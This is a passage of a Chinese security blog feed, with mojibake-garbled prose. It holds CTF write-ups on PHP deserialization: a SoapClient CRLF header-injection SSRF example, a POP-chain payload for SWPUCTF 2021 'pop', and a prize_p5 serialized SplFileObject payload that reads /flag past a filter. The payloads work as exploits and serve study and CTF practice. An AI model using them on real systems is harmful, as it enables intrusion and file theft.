href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html">https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html</a></p><p>å¯ä»¥ç»“åˆCRLFè¿›è¡Œxss =&gt; HRS</p><p>è¿™ä¸ªSoapClietåŸç”Ÿç±»æˆ‘æ„Ÿè§‰å°±æ˜¯ç»“åˆCRLFè¿›è¡Œä¸€ä¸ªhttpçš„ä¸€äº›ä¿®æ”¹</p><p>å¯ä»¥ä¸¾ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&#x27;http://192.168.122.136:2022/&#x27;</span>;<br><span class="hljs-variable">$post_data</span> = <span class="hljs-string">&#x27;data=ki10Moc&#x27;</span>;   <span class="hljs-comment">//è¿™ä¸ªå°±æ˜¯ä¸€ä¸ªpostä¼ å‚ dataä¸ºå‚æ•° é‡Œé¢çš„å†…å®¹ä¸ºå€¼</span><br><span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cookie: PHPSESSID=8asIKRJGI2493324gfsjkk958&#x27;</span><br>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&#x27;Happy^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-variable">$headers</span>).<span class="hljs-string">&#x27;^^Content-Length: &#x27;</span>. (<span class="hljs-keyword">string</span>)<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post_data</span>).<span class="hljs-string">&#x27;^^^^&#x27;</span>.<span class="hljs-variable">$post_data</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;ki10Moc&#x27;</span>));<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();    <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç ä¿®æ”¹äº†Xffå¤´ cookieçš„å€¼ä»¥åŠUAå¤´çš„å†…å®¹</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>phpååºåˆ—åŒ–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpååºåˆ—åŒ–çš„ctfé¢˜ç›®</title>
    <link href="/2023/11/15/%E5%9C%A8ctf%E9%A2%98%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/11/15/%E5%9C%A8ctf%E9%A2%98%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-pop"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-pop" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]pop"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]pop</h1><p>è¿™ä¸€é“é¢˜æˆ‘çœ‹äº†å¥½ä¸€ä¼šwpæ‰æƒ³æ˜ç™½ï¼Œè¿˜æ˜¯å¤ªèœé¸¡äº†ï¼Œä¸‹é¢æ•´ç†ä¸€ä¸‹æ€è·¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;index.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w44m</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;aaa&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">&#x27;123456&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Getflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd ===<span class="hljs-string">&#x27;08067&#x27;</span>)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nono&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;w00m;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w22m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;w22m&#125;();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$w00m</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;w00m&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$w00m</span>);<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è§‚å¯Ÿphpä»£ç å¯ä»¥ï¼Œè¦æƒ³è·å¾—flagï¼Œæœ‰ä¸€ä¸ª function Getflag()å‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚</p><p>ç„¶ååœ¨w33mè¿™ä¸ªç±»ä¸­çœ‹åˆ°æœ‰ä¸€ä¸ªå‡½æ•°è°ƒç”¨çš„ã€‚</p><p>å³ï¼š$this-&gt;w00m-&gt;{$this-&gt;w22m}();  è¿™é‡Œw00mæ˜¯w44mè¿™ä¸ªç±»ï¼Œç„¶åä¸ºw22mæ˜¯Getflagè¿™ä¸ªå‡½æ•°ã€‚</p><p>è¿™é‡Œéœ€è¦è§¦å‘toStringé­”æœ¯æ–¹æ³•ï¼Œç„¶åé€šè¿‡echoè¿›è¡Œè¾“å‡ºï¼Œecho $this-&gt;w00m;ã€‚</p><p>é“¾å­ï¼š</p><p> getflag -&gt;tostring -&gt; _destruct å¾ˆçŸ­ã€‚</p><p>æœ€åéœ€è¦è¿›è¡Œurlç¼–ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w44m</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;w44m&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">&#x27;08067&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w22m</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w44m</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w22m</span>();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w33m</span>();<br><span class="hljs-variable">$c</span>-&gt;w00m=<span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$c</span>-&gt;w22m=Getflag;<br><span class="hljs-variable">$b</span>-&gt;w00m=<span class="hljs-variable">$c</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>));<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h1 id="prize-p5"><a href="#prize-p5" class="headerlink" title="prize_p5"></a>prize_p5</h1><p>å¾ˆæœ‰æ„æ€çš„ä¸€é“é¢˜ç›®ï¼Œé¢„æœŸè§£å°±æ˜¯é€šè¿‡å­—ç¬¦ä¸²é€ƒé€¸å»è¯»å–flagéé¢„æœŸå°±æ˜¯é€šè¿‡åå…­è¿›åˆ¶åˆ©ç”¨åŸç”Ÿç±»å»è¯»å–flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">catalogue</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span> = &quot;<span class="hljs-title">error</span>&quot;;</span><br><span class="hljs-class">        $<span class="hljs-title">this</span>-&gt;<span class="hljs-title">data</span> = &quot;<span class="hljs-title">hacker</span>&quot;;</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">__destruct</span>()</span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>($<span class="hljs-title">this</span>-&gt;<span class="hljs-title">data</span>);</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">error</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$OTL</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;OTL = <span class="hljs-variable">$OTL</span>;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;hello &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;OTL);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">escape</span></span>&#123;                                                                   <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;OTL&#x27;</span>;                                                 <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$phone</span> = <span class="hljs-string">&#x27;123666&#x27;</span>;                                             <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$email</span> = <span class="hljs-string">&#x27;sweet@OTL.com&#x27;</span>;                          <br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">abscond</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;NSS&#x27;</span>, <span class="hljs-string">&#x27;CTF&#x27;</span>, <span class="hljs-string">&#x27;OTL_QAQ&#x27;</span>, <span class="hljs-string">&#x27;hello&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$filter</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cata&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/object/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cata&#x27;</span>]))&#123;      <span class="hljs-comment">//è¿™ä¸ªobjectå°±æ˜¯objectå­—ç¬¦ä¸² æ‰€ä»¥ç”¨åŸç”Ÿç±»å»è¯»å–çš„æ—¶å€™ä¼šè¢«è¿‡æ»¤æ‰</span><br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cata&#x27;</span>]);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$cc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">catalogue</span>(); <br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$cc</span>));           <br>    &#125;    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono,you can not do that!&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable">$abscond</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">escape</span>();<br>        <span class="hljs-variable">$abscond</span>-&gt;name = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span class="hljs-variable">$abscond</span>-&gt;phone = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br>        <span class="hljs-variable">$abscond</span>-&gt;email = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br>        <span class="hljs-variable">$abscond</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$abscond</span>);<br>        <span class="hljs-variable">$escape</span> = <span class="hljs-title function_ invoke__">get_object_vars</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">abscond</span>(<span class="hljs-variable">$abscond</span>)));<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$escape</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$escape</span>[<span class="hljs-string">&#x27;email&#x27;</span>]));<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I&#x27;m sorry to tell you that you are wrong&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å…ˆæ¥è¯´ä¸€ä¸‹éé¢„æœŸè§£ï¼š</p><p>éé¢„æœŸå°±æ˜¯åˆ©ç”¨Globlterator  å»è¯»å–flagçš„å…·ä½“ä½ç½®ï¼Œä½†æ˜¯ç¯å¢ƒå¯èƒ½å‡ºäº†ç‚¹é—®é¢˜ï¼Œå‡ºä¸æ¥ï¼Œçœ‹å…¶ä»–çš„wpæ˜¯  /flag</p><p>ç”¨SplFileObject  å»è¯»å–çš„æ—¶å€™objectä¼šè¢«è¿‡æ»¤æ‰</p><p>ä½†æ˜¯æœ‰ä¸€ç§æ–¹æ³•å°±æ˜¯åˆ©ç”¨åå…­è¿›åˆ¶   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;catalogue&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;class&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;SplFileObject&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;data&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;/flag&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>æŠŠSplFileObjectå‰é¢çš„é‚£ä¸ªå°å†™çš„sæ›¿æ¢æˆå¤§å†™çš„S ç„¶ååé¢çš„Objectä»»æ„ä¸€ä¸ªå­—ç¬¦æ›¿æ¢æˆåå…­è¿›åˆ¶</p><p>Objectå¯¹åº”çš„åå…­è¿›åˆ¶æ˜¯\x4F\x62\x6A\x65\x63\x74  ç„¶åä¼ çš„æ—¶å€™æŠŠxå»æ‰</p><p>ç„¶åä¸‹é¢æ˜¯é¢„æœŸè§£ é€šè¿‡å­—ç¬¦ä¸²é€ƒé€¸</p><p>è¿™ä¸ªé¢˜çš„è¯å¯ä»¥é€šè¿‡å­—ç¬¦ä¸²é€ƒé€¸å¢åŠ ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å­—ç¬¦ä¸²é€ƒé€¸å‡å°‘  ä¸‹é¢ä»‹ç»ä¸€ä¸‹å­—ç¬¦ä¸²é€ƒé€¸å¢åŠ çš„ç”¨æ³•</p><p><strong>å­—ç¬¦ä¸²é€ƒé€¸å¢åŠ ï¼š</strong></p><p>æˆ‘è¿™ä¸ªæ˜¯é€šè¿‡NSSæ¥çš„ï¼Œä½ é€šè¿‡å…¶ä»–çš„æ¯”hackerå°‘çš„å­—ç¬¦æ¥çš„è¯éƒ½å¯ä»¥å…¶å®</p><p>å…ˆæ¥çœ‹ä¸‹é¢è¿™æ®µä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))&#123;<br>       <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))&#123;<br>           <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono,you can not do that!&quot;</span>);<br>       &#125;<br>       <span class="hljs-variable">$abscond</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">escape</span>();<br>       <span class="hljs-variable">$abscond</span>-&gt;name = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>       <span class="hljs-variable">$abscond</span>-&gt;phone = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br>       <span class="hljs-variable">$abscond</span>-&gt;email = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br>       <span class="hljs-variable">$abscond</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$abscond</span>);<br>       <span class="hljs-variable">$escape</span> = <span class="hljs-title function_ invoke__">get_object_vars</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">abscond</span>(<span class="hljs-variable">$abscond</span>)));<br>       <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$escape</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]))&#123;<br>       <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$escape</span>[<span class="hljs-string">&#x27;email&#x27;</span>]));<br>       &#125;<br>       <span class="hljs-keyword">else</span>&#123;<br>           <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I&#x27;m sorry to tell you that you are wrong&quot;</span>;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªé¦–å…ˆå¯¹emailçš„å€¼è¿›è¡Œäº†ä¸€ä¸ª/flagçš„æ£€æµ‹ï¼Œï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰</p><p>ç„¶ååˆ†åˆ«POSTä¼ å‚ä¸‰ä¸ªå‚æ•° abscondè¿™ä¸ªå‡½æ•°å°±æ˜¯è¿›è¡Œä¸€ä¸ªæ›¿æ¢  â€˜NSSâ€™, â€˜CTFâ€™, â€˜OTL_QAQâ€™, â€˜helloâ€™  å¦‚æœåŒ¹é…åˆ°äº†ä¸Šé¢å››ä¸ªå€¼çš„è¯ï¼Œå°±ä¼šæ›¿æ¢æˆhacker</p><p>æ¥ä¸‹æ¥è¿›è¡Œä¸€ä¸ªååºåˆ—åŒ–ï¼Œget_object_varsè¿™ä¸ªå‡½æ•°çš„æ„æ€å¯ä»¥çœ‹çœ‹ä»¥ä¸‹æ¼”ç¤ºçš„ç†è§£ä¸€ä¸‹</p><p>æ€»çš„è¯´å°±æ˜¯<strong>ç”¨äºè·å–æŒ‡å®šå¯¹è±¡çš„å±æ€§å’Œå€¼ï¼Œå¹¶è¿”å›ä¸€ä¸ªå…³è”æ•°ç»„ã€‚</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = <span class="hljs-variable">$age</span>;<br>    